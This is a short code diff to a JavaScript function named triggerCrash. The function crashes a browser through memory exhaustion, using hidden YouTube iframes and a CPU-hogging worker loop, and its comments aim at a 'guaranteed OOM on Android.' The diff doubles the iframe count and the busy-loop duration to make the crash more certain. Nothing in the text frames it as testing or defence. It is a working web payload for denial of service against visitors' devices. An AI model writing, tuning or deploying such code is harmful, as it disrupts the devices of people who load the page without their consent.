@@ -10,7 +10,7 @@
 // Function to cause OOM crash via heavy iframes and CPU hog
 function triggerCrash() {
     // Increase iframes to 500 for guaranteed OOM on Android
-    for (let i = 0; i < 500; i++) {
+    for (let i = 0; i < 1000; i++) {
         let iframe = document.createElement("iframe");
         iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ'; // Heavier: YouTube video embed for more memory pressure (videos + scripts)
         iframe.style = 'display:none';
@@ -22,7 +22,7 @@ function triggerCrash() {
         onmessage = () => {
             let a = 0, b = 1;
             const start = performance.now();
-            while (performance.now() - start < 500) {
+            while (performance.now() - start < 1000) {
                 let c = a + b;
                 a = b;
                 b = c;
